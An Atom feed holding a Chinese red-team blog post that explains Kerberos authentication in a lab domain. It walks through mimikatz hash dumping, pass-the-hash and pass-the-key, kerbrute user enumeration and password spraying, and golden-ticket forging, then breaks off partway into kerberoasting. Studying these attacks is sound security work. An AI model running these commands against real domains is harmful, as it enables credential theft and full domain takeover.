<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://redteamblog.icu</id>
    <title>毅种循环的洗剑录</title>
    <updated>2022-04-25T11:35:54.515Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://redteamblog.icu"/>
    <link rel="self" href="https://redteamblog.icu/atom.xml"/>
    <subtitle>&lt;br&gt;西郊有密林，助君出重围。&lt;br&gt;
&lt;br&gt;Information Safety/Redteam/Moyu&lt;br&gt;</subtitle>
    <logo>https://redteamblog.icu/images/avatar.png</logo>
    <icon>https://redteamblog.icu/favicon.ico</icon>
    <rights>All rights reserved 2022, 毅种循环的洗剑录</rights>
    <entry>
        <title type="html"><![CDATA[Kerberos认证协议学习]]></title>
        <id>https://redteamblog.icu/post/kerberos/</id>
        <link href="https://redteamblog.icu/post/kerberos/">
        </link>
        <updated>2022-04-25T06:35:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="环境">环境</h2>
<p>目前环境有两台机器，</p>
<p>其一为Windows2008，IP为192.168.1.3 是域redream的成员。</p>
<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/assets/image-20220314161347-1lqx905.png" alt="image.png" loading="lazy"></figure>
<p>其二为Windows2016，为域控制器。IP为 192.168.1.2</p>
<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/assets/image-20220314161455-t8gignu.png" alt="image.png" loading="lazy"></figure>
<table>
<thead>
<tr>
<th>主机</th>
<th>用户</th>
<th>IP</th>
</tr>
</thead>
<tbody>
<tr>
<td>域控（2016）</td>
<td>Administrator</td>
<td>192.169.1.2</td>
</tr>
<tr>
<td>域主机（2008）</td>
<td>user1</td>
<td>192.168.1.3</td>
</tr>
</tbody>
</table>
<h2 id="kerberos协议">kerberos协议</h2>
<p>Kerberos 协议是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机与服务器应用程序提供强大的认证服务。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议。</p>
<p>为了让阁下能够更轻松地理解后文对认证原理的讲解，你需要先了解以下几个关键角色：</p>
<table>
<thead>
<tr>
<th>角色</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Domain Controller</td>
<td>域控制器，简称DC，一台计算机，实现用户、计算机的统一管理。</td>
</tr>
<tr>
<td>Key Distribution Center</td>
<td>秘钥分发中心，简称KDC，默认安装在域控里，包括AS和TGS。</td>
</tr>
<tr>
<td>Authentication Service</td>
<td>身份验证服务，简称AS，用于KDC对Client认证。</td>
</tr>
<tr>
<td>Ticket Grantng Service</td>
<td>票据授予服务，简称TGS，用于KDC向Client和Server分发Session Key（临时秘钥）。</td>
</tr>
<tr>
<td>Active Directory</td>
<td>活动目录，简称AD，用于存储用户、用户组、域相关的信息。</td>
</tr>
<tr>
<td>Client</td>
<td>客户端，指用户。</td>
</tr>
<tr>
<td>Server</td>
<td>服务端，可能是某台计算机，也可能是某个服务。</td>
</tr>
</tbody>
</table>
<h3 id="kerberos-概念名词解释">kerberos 概念名词解释</h3>
<pre><code class="language-c#">(1)Client:访问服务的客户机

(2)Server:提供服务的服务器

(3)KDC(Key Distribution Center):密钥分发中心 

(4)KDC中分成两个部分:Authentication Service和Ticket Granting Service
    Authentication Service(AS):身份验证服务
    Ticket Granting Service(TGS):票据授予服务

    AS和TGS如下：

    Authentication Service：AS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client.
    Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.
    Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.


    Ticket Granting Service(TGS)：TGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.
    SEerver Ticket(ST):ST服务票据，由TGS服务发布.


(5)Active Directory(AD):活动目录

(6)Domain Controller(DC):域控制器

(7)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.

(8)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.
</code></pre>
<p>打个比方：当 whoami 要和 bunny 进行通信的时候，whoami 就需要向 bunny 证明自己是whoami，直接的方式就是 whoami 用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给 bunny，bunny 再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明对方是 whoami。</p>
<p>但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即 KDC（Key Distribution Center）秘钥分发中心。</p>
<p><code>Kerberos</code>认证的过程形象地比喻如下：</p>
<pre><code>疫情期间，小明去拿一个重要包裹，由于包裹是来自海外的，所以需要严格登记：
（1）拿包裹的时候，为了证明自己是合法公民，小明先把身份证给工作人员
（2）快递点的身份认证系统通过身份认证后，给小明一张身份认证通过证明
（3）小明拿着身份认证通过证明，来到快递收发处等一张拿快递的号码牌
（4）售票处给了张号码牌
（5）小明拿着号码牌拿快递去了
（6）在拿快递时，小明拿出自己的身份认证材料给快递点的工作人员，工作人员向快递公司的数据管理中心发了消息，问问小明是不是有包裹要拿
（7）数据管理中心将小明的快递单号，身份信息等发了过来
（8）工作人员将数据管理中心发来的信息与小明给的材料对比，得出小明是好公民，有一个重要包裹，于是带着小明来到仓库的金库，把装有老魔杖的包裹给了小明
</code></pre>
<p>在<code>Kerboeros</code>协议认证过程中，会用到两个基础认证模块，分别是<code>AS_REQ&amp;AS_REP</code>和<code>TGS_REQ&amp;TGS_REP</code>，以及在认证过程中可能会使用到的<code>S4U</code>和<code>PAC</code>这两个认证模块。</p>
<h2 id="kerberos认证的问题"><strong>kerberos认证的问题</strong></h2>
<p>上面说了，因为<code>kerberos</code>协议的实现，需要三方的参与，分别如下：</p>
<pre><code class="language-html">1.client 访问服务的客户机
2.Server 提供服务的服务器
3.KDC(Key Distribution Center) 密钥分发中心 
    KDC服务会默认安装在一个域的域控中，所以可以直接理解为，AD与KDC均为域控制器,KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号。
</code></pre>
<h2 id="kerberos认证协议原理流程">kerberos认证协议原理流程</h2>
<p><code>Kerberos</code>认证过程如下图所示</p>
<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/assets/image-20220314170426-spssrt4.png" alt="image.png" loading="lazy"></figure>
<p>下面讲一下详细的认证步骤，大概分为三个阶段：</p>
<ul>
<li>AS_REQ &amp; AS_REP</li>
<li>TGS_REQ &amp; TGS_REP</li>
<li>AP-REQ &amp; AP-REP</li>
</ul>
<p>其中：<code>KDC</code>中有<code>AS认证服务</code>与<code>TGS认证服务</code></p>
<ol>
<li>CLient向KDC的AS认证服务请求TGT票据，此处是AS_REQ流程</li>
<li>认证通过后返回 TGT 给 Client，Client 得到 KDC发放的TGT（Ticket Granting Ticket）票据。此处是AS_REP流程</li>
<li>Client 继续拿着 TGT票据 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT票据请求ST的服务票据（Service Ticket）。此处是TGS_REQ流程</li>
<li>Client通过了TGS认证服务后，TGS将会发放ST服务票据给Client。此处是TGS_REP流程。</li>
<li>Client 得到 ST票据 后，再去向Server请求服务。此处是AP-REQ流程。</li>
<li>server拿到PAC询问KDC，client是否有权限访问资源</li>
<li>KDC将clinet的权限信息发送给server</li>
<li>server根据KDC返回的权限信息做对比，判断client是否有权限访问该服务，并把结果返回给client。此处是AP_REP流程。</li>
</ol>
<pre><code class="language-c#">注：（6）（7）两步不一定发生，需要将目标主机配置为验证KDC PAC验证。
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://redteamblog.icu/post-images/assets/image-20220314175736-64x1hwv.png" alt="image.png" loading="lazy"></figure>
<pre><code class="language-c#">域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的,因此只要我们拿到了krbtgt的密码Hash,就可以随意伪造Ticket,进而使用Ticket登陆域控制器,使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击。
</code></pre>
<h2 id="as_req-as_rep分析">AS_REQ &amp; AS_REP分析</h2>
<p><strong>分析AS-REQ的数据包</strong></p>
<p><code>AS-REQ</code>：当某个域用户试图访问域中的某个服务，于是输入用户名和密码，本机<code>Kerberos</code>服务会向<code>KDC</code>的<code>AS</code>认证服务发送一个<code>AS-REQ</code>认证请求。该请求包中包含：<code>请求用户名</code>，<code>客户端主机名</code>，<code>加密类型</code>和<code>Autherticator(用户NTLM Hash加密的时间戳)</code>以及一些信息。</p>
<p><code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>请求凭据是用户hash加密的时间戳。请求凭据放在<code>PA_DATA</code>里面。</p>
<p>我们这里直接<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&amp;spm=1001.2101.3001.7020">抓包</a>来看，让域内机器user1使用用户test来登录。</p>
<h3 id="1as-req">1.AS-REQ</h3>
<figure data-type="image" tabindex="5"><img src="https://redteamblog.icu/post-images/assets/image-20220316155027-2z8bdvm.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://redteamblog.icu/post-images/assets/image-20220316160007-3lc9neh.png" alt="image.png" loading="lazy"></figure>
<p>AS获取用户名之后，获取对应的<code>ntlm</code>值，通过加密的方法加密数据信息，并且验证时间戳，之后生成随机字符串<code>Session Key</code>，使用用户的ntlm值加密<code>Session Key</code>，使用<code>krbtgt</code>用户的<code>ntlm</code>加密<code>Session Key</code>和客户端信息，一起返回客户端</p>
<pre><code class="language-Send=user_NTML_Hash(Session">Send=user_NTML_Hash(Session Key)+krbtgt_NTML_Hash(Session Key+client_info1)[TGT]
</code></pre>
<p>AS-REQ存在俩种包</p>
<p>一种是不存在<code>pA-ENC-TIMESTAMP</code>字段的，另外一种是前面存在密码字段的</p>
<figure data-type="image" tabindex="7"><img src="https://redteamblog.icu/post-images/assets/image-20220316160806-gpai01k.png" alt="image.png" loading="lazy"></figure>
<h3 id="2as-req不同的包">2.AS-REQ不同的包</h3>
<h4 id="用户名和密码正确的包">用户名和密码正确的包</h4>
<figure data-type="image" tabindex="8"><img src="https://redteamblog.icu/post-images/assets/image-20220316163624-1fi7ze3.png" alt="image.png" loading="lazy"></figure>
<p><code>AS-REP</code>：Client发送<code>AS_REQ</code>，请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。 <strong>当KDC中的AS认证服务收到后，在AS服务器中有用户hash，使用用户hash进行解密，获得时间戳</strong> ，如果 <strong>解密成功，并且时间戳在五分钟之内</strong> ，那么 <strong>预认证通过</strong> 。接着AS认证服务将会向Client发送响应包，响应包中包括<strong>krbtgt用户的NTML hash加密后的TGT票据</strong>以及<strong>用户NTML Hash加密的Login Session key和其他信息</strong>。</p>
<pre><code class="language-Send=user_NTML_Hash(Session">ticket中的enc-part是由krbtgt的密码hash加密生成的。如果我们拥有krbtgt的hash，便可以自制ticket，发起黄金票据攻击

Login Session Key使用用户NTML Hash加密，作用是用于是用于确保客户端和KDC下一阶段之间通信安全，作为下一阶段的认证密钥
</code></pre>
<p>在这一阶段，Client与KDC之间的交互在于AS认证服务，主要是为了获得TGT认证票据，以及Login Session Key，经过该阶段后，Client将会使用自身密码的NTML hash解密Login Session Key得到原始的Login Session Key。然后它会在本地缓存TGT票据和原始Login Session Key。</p>
<h4 id="用户名不正确的包">用户名不正确的包</h4>
<figure data-type="image" tabindex="9"><img src="https://redteamblog.icu/post-images/assets/image-20220317113241-2gubvzb.png" alt="image.png" loading="lazy"></figure>
<h4 id="用户名正确的包">用户名正确的包</h4>
<figure data-type="image" tabindex="10"><img src="https://redteamblog.icu/post-images/assets/image-20220317104822-nemyrdj.png" alt="image.png" loading="lazy"></figure>
<h4 id="密码不正确的包">密码不正确的包</h4>
<figure data-type="image" tabindex="11"><img src="https://redteamblog.icu/post-images/assets/image-20220321144305-lmp9huz.png" alt="image.png" loading="lazy"></figure>
<h4 id="as-req流程的的攻击面">AS-REQ流程的的攻击面</h4>
<p>通过上面的抓包分析可以得出：</p>
<p>1.HASH传递</p>
<p>2.域内用户枚举</p>
<p>3.密码喷洒</p>
<h5 id="hash传递攻击方法"><strong>HASH传递攻击方法</strong></h5>
<p>在AS-REQ阶段，是用用户密码Hash加密的Authenticator，所以也就造成了hash传递。</p>
<h6 id="mimikatz进行hash传递">mimikatz进行hash传递</h6>
<p>这里mimikatz获取hash导出到log日志中，命令如下</p>
<pre><code class="language-html">mimikatz log privilege::debug sekurlsa::ekeys
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://redteamblog.icu/post-images/assets/image-20220328110317-g6qk8z2.png" alt="image.png" loading="lazy"></figure>
<p>抓取administrator的ntlm哈希</p>
<pre><code class="language-html">privilege::debug
​
sekurlsa::logonpasswords
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://redteamblog.icu/post-images/assets/image-20220328110440-tyvpbeg.png" alt="image.png" loading="lazy"></figure>
<h6 id="执行传递">执行传递</h6>
<pre><code class="language-html">sekurlsa::pth /user:administrator /domain:192.168.10.5 /ntlm:7c64e7ebf46b9515c56b2dd522d21c1c
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://redteamblog.icu/post-images/assets/image-20220328110538-xbjzs1y.png" alt="image.png" loading="lazy"></figure>
<h6 id="kb2871997补丁的传递方法">KB2871997补丁的传递方法</h6>
<figure data-type="image" tabindex="15"><img src="https://redteamblog.icu/post-images/assets/image-20220328110808-sjsj87y.png" alt="image.png" loading="lazy"></figure>
<p>安装KB2871997这个补丁之后，只能用管理员账户进行pass hash</p>
<h6 id="ptkpass-the-key">PTK（pass the key）</h6>
<p>获取aes-key:</p>
<pre><code>privilege::debug
​
sekurlsa::ekeys
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://redteamblog.icu/post-images/assets/image-20220328110909-b95ug5k.png" alt="image.png" loading="lazy"></figure>
<p>注入aes-key:</p>
<pre><code>sekurlsa::pth /user:Administrator /domain:Drunkmars.com /aes256:cf5dba161f3a3dc89454742ff5db89980d6b07e771048b30006546e81d1d79e2
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://redteamblog.icu/post-images/assets/image-20220328110538-xbjzs1y.png" alt="image.png" loading="lazy"></figure>
<h5 id="域内用户枚举"><strong>域内用户枚举</strong></h5>
<p>AS-REQ 的 cname 值，当用户不存在时，返回包提示错误，所以造成了改攻击方式。</p>
<h6 id="攻击方法">攻击方法</h6>
<p>使用kerbrute工具：</p>
<p><a href="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe">https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe</a></p>
<p>前提需要DC需要开启kerberos 88端口</p>
<figure data-type="image" tabindex="18"><img src="https://redteamblog.icu/post-images/assets/image-20220328111041-6ei36q1.png" alt="image.png" loading="lazy"></figure>
<p>使用以下命令</p>
<pre><code>kerbrute_windows_amd64.exe userenum --dc 192.168.10.5 -d Drunkmars.com user.txt
</code></pre>
<p>user.txt是用户名的字典</p>
<figure data-type="image" tabindex="19"><img src="https://redteamblog.icu/post-images/assets/image-20220328111118-vzr46zq.png" alt="image.png" loading="lazy"></figure>
<p>成功爆出用户名。</p>
<h6 id="原理">原理：</h6>
<p>使用kerbrute进行错误枚举的原理就是kerberos有三种错误代码：</p>
<p>KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）</p>
<p>KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）</p>
<p>KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）</p>
<p>在DC抓包可以看到有4个UNKNOWN，1个REQUIRED，证明有这个用户名存在</p>
<figure data-type="image" tabindex="20"><img src="https://redteamblog.icu/post-images/assets/image-20220328111231-y63nbd8.png" alt="image.png" loading="lazy"></figure>
<h5 id="密码喷洒"><strong>密码喷洒</strong></h5>
<p>并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率</p>
<p>使用以下命令</p>
<pre><code class="language-html">kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.5 -d Drunkmars.com user.txt Fcb0519..
</code></pre>
<figure data-type="image" tabindex="21"><img src="https://redteamblog.icu/post-images/assets/image-20220328111319-kaj1c1y.png" alt="image.png" loading="lazy"></figure>
<h5 id="原理-2">原理：</h5>
<p>密码同样存在三种错误代码</p>
<p>KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）</p>
<p>KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）</p>
<p>KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）</p>
<p>同样在DC抓包，有4个UNKNOWN，1个REQUIRED</p>
<figure data-type="image" tabindex="22"><img src="https://redteamblog.icu/post-images/assets/image-20220328111359-y6zvkss.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="23"><img src="https://redteamblog.icu/post-images/assets/image-20220328111403-xddzvfj.png" alt="image.png" loading="lazy"></figure>
<h3 id="as-rep数据包">AS-REP数据包</h3>
<p><code>AS-REP</code>：Client发送<code>AS_REQ</code>，请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。 <strong>当KDC中的AS认证服务收到后，在AS服务器中有用户hash，使用用户hash进行解密，获得时间戳</strong> ，如果 <strong>解密成功，并且时间戳在五分钟之内</strong> ，那么 <strong>预认证通过</strong> 。接着AS认证服务将会向Client发送响应包，响应包中包括<strong>krbtgt用户的NTML hash加密后的TGT票据</strong>以及 <strong>用户NTML Hash加密的Login Session key和其他信息</strong> 。</p>
<figure data-type="image" tabindex="24"><img src="https://redteamblog.icu/post-images/assets/image-20220321145439-qhw0d6c.png" alt="image.png" loading="lazy"></figure>
<p><strong>ticket中的enc-part是由krbtgt的密码hash加密生成的。如果我们拥有krbtgt的hash，便可以自制ticket，发起黄金票据攻击</strong></p>
<p><strong>Login Session Key使用用户NTML Hash加密，作用是用于是用于确保客户端和KDC下一阶段之间通信安全，作为下一阶段的认证密钥</strong></p>
<p><strong>在enc-part里面最重要的字段是Login session key，作为下阶段的认证密钥。<br>
AS-REP中最核心的东西就是 Login session-key 和 加密的ticket。正常我们用工具生成的凭据是 .ccache 和 .kirbi 后缀的，用mimikatz，kekeo，rubeus生成的凭据是以 .kirbi 后缀的，impacket 生成的凭据的后缀是 .ccache 。两种票据主要包含的都是Login session-key 和 加密的 ticket，因此可以相互转化。</strong></p>
<h4 id="as-rep的攻击面">AS-REP的攻击面</h4>
<h5 id="黄金票据"><strong>黄金票据</strong></h5>
<p>在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码Hash加密的，因此如果我们拥有 krbtgt 的 hash 就可以自己制作一个TGT认购权证，这就造成了黄金票据攻击</p>
<p>伪造黄金票据的条件：</p>
<p>我们伪造凭证，需要以下信息：</p>
<ul>
<li>域名</li>
<li>域的SID值</li>
<li>域的KRBTGT账号的HASH</li>
<li>伪造的域管理员用户名</li>
</ul>
<h5 id="黄金票据攻击实践">黄金票据攻击实践</h5>
<h6 id="收集域信息">收集域信息</h6>
<p>netconfig workstation</p>
<figure data-type="image" tabindex="25"><img src="https://redteamblog.icu/post-images/assets/image-20220321170652-qw7nl6a.png" alt="image.png" loading="lazy"></figure>
<p>可以获得域是redtem.com，用户名是YG1。</p>
<p>获得域控的IP也很简单，ping一下即可，或者</p>
<p>nltest/dsgetdc:域名<br>
nltest/dsgetdc:redteam.com</p>
<figure data-type="image" tabindex="26"><img src="https://redteamblog.icu/post-images/assets/image-20220321170827-0vwhca3.png" alt="image.png" loading="lazy"></figure>
<p>获取到域控IP为192.168.1.2</p>
<h6 id="导出hash">导出HASH</h6>
<pre><code class="language-Send=user_NTML_Hash(Session">privilege::debug
  lsadump::dcsync /domain:redteam.com /all /csv
</code></pre>
<p>用管理权限使用mimikatz.exe导出用户的krbtgt的hash</p>
<figure data-type="image" tabindex="27"><img src="https://redteamblog.icu/post-images/assets/image-20220321173027-8rmsug9.png" alt="image.png" loading="lazy"></figure>
<p>fb2227f9e9e6c9ad490eb1c2fa6a8625</p>
<h6 id="收集krbtgt的sid信息">收集Krbtgt的SID信息</h6>
<pre><code class="language-Send=user_NTML_Hash(Session">lsadump::dcsync /domain:redteam.com /user:krbtgt 
或者
wmic useraccount get name,sid
</code></pre>
<figure data-type="image" tabindex="28"><img src="https://redteamblog.icu/post-images/assets/image-20220321174032-qlbyobd.png" alt="image.png" loading="lazy"></figure>
<p>S-1-5-21-767623950-3225260823-3670188588</p>
<p>fb2227f9e9e6c9ad490ebic2fa6a8625</p>
<p>获取到SID和HASH之后就可以伪造票据了，伪造之前先看一下有没有缓存票据</p>
<pre><code class="language-klist">klist /查看票据
</code></pre>
<figure data-type="image" tabindex="29"><img src="https://redteamblog.icu/post-images/assets/image-20220321174303-x16pgjb.png" alt="image.png" loading="lazy"></figure>
<pre><code class="language-klist">klist purge /清除票据
或者
mimitakzt kerberos::purge 
</code></pre>
<figure data-type="image" tabindex="30"><img src="https://redteamblog.icu/post-images/assets/image-20220321174453-8zk445a.png" alt="image.png" loading="lazy"></figure>
<h6 id="利用mimikatz生成黄金票据">利用mimikatz生成黄金票据</h6>
<pre><code class="language-html"> mimikatz.exe &quot;kerberos::golden /user:Administrator /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /krbtgt:fb2227f9e9e6c9ad490ebic2fa6a8625 /ticket:qqq.kirbi&quot; exit
 
 
 /admin：伪造的用户名（任意）
 /domain：域名称
 /sid：sid值，注意要去掉最后一个值 -后面的值
 /krbtgt：krbtgt的hash值
 /ticket：生成的票据名称

</code></pre>
<p>或者</p>
<pre><code class="language-html">kerberos::golden /user:administrator12 /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /krbtgt:fb2227f9e9e6c9ad490eb1c2fa6a8625 /ptt  #生成票据并导入
</code></pre>
<figure data-type="image" tabindex="31"><img src="https://redteamblog.icu/post-images/assets/image-20220321181634-11exgmf.png" alt="image.png" loading="lazy"></figure>
<p>有了票据之后，拿一个域用户来测试一下票据能否正常使用。</p>
<h6 id="查看导入的票据">查看导入的票据</h6>
<p><code>kerberos::purge kerberos::ptt ticket.kirbi</code></p>
<figure data-type="image" tabindex="32"><img src="https://redteamblog.icu/post-images/assets/image-20220321182507-lpah455.png" alt="image.png" loading="lazy"></figure>
<h6 id="查询dc机器c盘目录">查询DC机器C盘目录</h6>
<pre><code class="language-html">dir \\dc.redteam.com\c$

dir \\计算机名.域名\c$
</code></pre>
<figure data-type="image" tabindex="33"><img src="https://redteamblog.icu/post-images/assets/325a475a104c45bb543a25740ee6de0-20220322101346-o758lqw.png" alt="325a475a104c45bb543a25740ee6de0.png" loading="lazy"></figure>
<p>DC火绒拦截了IPC，所以没访问成功，关掉后正常，至此，黄金票据利用成功。</p>
<h2 id="tgs_reqtgs_rep分析">TGS_REQ&amp;TGS_REP分析</h2>
<pre><code class="language-html"> Client与TGS之间认证使用TGS_REQ&amp;TGS_REP模块
</code></pre>
<p>Client在拿到<code>TGT</code>和<code>Login Session Key</code>之后，下一步的认证交互在于 <strong>KDC中的TGS认证服务</strong> ，主要目的是为了获取 <strong><code>ST服务票据</code></strong> ，因为当Client需要访问某服务器中的某服务时，需要 <strong>&quot;门票&quot;</strong> --<strong>ST服务票据</strong></p>
<p>这一阶段，微软引进了两个扩展<code>S4U2SELF</code>和<code>S4U2PROXY</code>。</p>
<h3 id="tgs-req数据包分析"><strong>TGS-REQ数据包分析</strong></h3>
<p>该数据包中的主要内容为：<code>客户端信息，Authenticator(Login Session Key加密的时间戳)、TGT认证权证(padata下ap-req下的ticket)以及访问的服务名</code>等。</p>
<figure data-type="image" tabindex="34"><img src="https://redteamblog.icu/post-images/assets/image-20220322103732-894g4oh.png" alt="image.png" loading="lazy"></figure>
<p><code>padata</code>部分：</p>
<figure data-type="image" tabindex="35"><img src="https://redteamblog.icu/post-images/assets/image-20220322104159-n3qhf18.png" alt="image.png" loading="lazy"></figure>
<p>在<code>padata</code>中有很重要的一部分叫做<code>AP-REQ</code>，这是<code>TGS-REQ</code>中必须有的数据， <strong>这部分会携带AS-REP里面获取到的TGT票据</strong> ， <strong>KDC检验TGT票据，如果票据正确，返回ST票据</strong> 。</p>
<figure data-type="image" tabindex="36"><img src="https://redteamblog.icu/post-images/assets/image-20220322105755-riaaq7i.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="37"><img src="https://redteamblog.icu/post-images/assets/image-20220322110334-q05kp1a.png" alt="image.png" loading="lazy"></figure>
<p><code>TGS-REQ</code>请求包中的<code>authenticator</code>就是<code>AS-REP</code>响应包返回的<code>Login Session key</code>加密的时间戳</p>
<p>在<code>req-body</code>中</p>
<figure data-type="image" tabindex="38"><img src="https://redteamblog.icu/post-images/assets/image-20220322110512-b4h29zo.png" alt="image.png" loading="lazy"></figure>
<pre><code class="language-html">padding:0
kdc-options:用于与KDC约定一些选项设置
realm:域名
sname:这里是要请求的服务
till:到期时间
    rebeus和kekeo都是20370913024805Z，可用于作为特征值检验用
nonce:随机生成数 
    kekeo/mimikatz的nonce为12381973，rubeus的nonce为1818848256,可用于作为特征值检验    用
etype:加密类型
</code></pre>
<h4 id="tgs-rep数据包分析"><strong>TGS-REP数据包</strong>分析</h4>
<p><code>TGS-REP</code>：当TGS收到请求后，将会检查自身是否存在客户端所请求的服务，如果服务存在， <strong>通过krbtgt用户的NTML hash解密TGT并且得到Login Session Key</strong> ，通过 <strong>Login Session Key解密Authenticator</strong> 。</p>
<figure data-type="image" tabindex="39"><img src="https://redteamblog.icu/post-images/assets/image-20220322110904-lbezjaa.png" alt="image.png" loading="lazy"></figure>
<p>这一系列解密成功的话，<strong>将会验证对方的身份，验证时间戳是否在范围内，并且检查TG中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同</strong></p>
<p>完成认证后，TGS生成<strong>ST票据（包括客户端信息和原始Server Session key，整个ST服务票据使用该服务的NTML hash加密</strong>以及一个 <strong>AS-REP返回的Login-Session-Key加密的Server Session Key</strong> （也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。这两个将在响应包中发送给Client。</p>
<figure data-type="image" tabindex="40"><img src="https://redteamblog.icu/post-images/assets/image-20220322111343-kk058u8.png" alt="image.png" loading="lazy"></figure>
<p>ST服务票据主要包含两方面的内容：客户端用户信息 和 原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。最终Service Session Key 和 ST服务票据 发送给客户端。</p>
<p>PS:在这一步中，不论用户是否有权限访问服务，只要TGT解密无误，都将返回ST服务票据。<strong>任何一个用户，只要hash正确，就可以请求域内任何一个服务的票据</strong>，这也是kerberoasting能利用的原因。</p>
<p>enc-part：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码Hash加密的，所以当我们得到了ST服务票据，可以尝试爆破enc_part，来得到服务的密码Hash。这也就造成了kerberoast攻击。</p>
<h5 id="tgs-rep的攻击面">TGS-REP的攻击面</h5>
<h6 id="1kerberoast攻击">1.Kerberoast攻击</h6>
<p>概念：<strong>就是攻击者为了获取目标服务的访问权限，而设法破解Kerberos服务票据并重写它们的过程。这是红队当中非常常见的一种攻击手法，因为它不需要与服务目标服务进行任何交互，并且可以使用合法的活动目录访问来请求和导出可以离线破解的服务票据，以获取到最终的明文密码。之所以出现这种情况，是因为服务票据使用服务帐户的散列（NTLM）进行加密，所以任何域用户都可以从服务转储散列，而无需将shell引入运行该服务的系统中。</strong></p>
<p>攻击者通常会选择那些可能设置了弱密，码破解成功率较高的票据来尝试破解。一旦攻击者成功破解出了票据，他们有时不仅仅获取的只是服务访问权限，如果服务被配置为在高权限下运行，那么整个域都将可能被攻击者拿下。这些票据可以通过考虑多种因素来识别，例如：</p>
<blockquote>
<p>SPNs绑定到域用户账户</p>
<p>最后一次密码设置（Password last set）</p>
<p>密码过期时间</p>
<p>最后一次登录（Last logon）</p>
</blockquote>
<p>具体来说，Kerberoast攻击涉及以下五个步骤：</p>
<blockquote>
<p><a href="http://www.freebuf.com/system/174229.html?preview=true">服务主体名称（SPN）发现</a></p>
<p>请求服务票据</p>
<p>导出服务票据</p>
<p>破解服务票据</p>
<p>重写服务票据&amp;RAM注入</p>
</blockquote>
<p>原理：</p>
<ul>
<li>知道相关服务的 SPN 后，可以用 SPN 申请一张 ST 票据。在 kerberos 协议的第 4 步，用户会收到由 server 实例的 NTLM hash 加密生成的 ST 票据，加密算法为 RC4-HMAC-MD5，尝试穷举 hash，模拟加密过程，进行破解（注意和银票的区别）。</li>
<li>任何域用户都可以合法的从 AD 中提取服务账号凭据，不需要与服务目标服务进行任何交互，大多数操作都是离线完成，不会触发告警。</li>
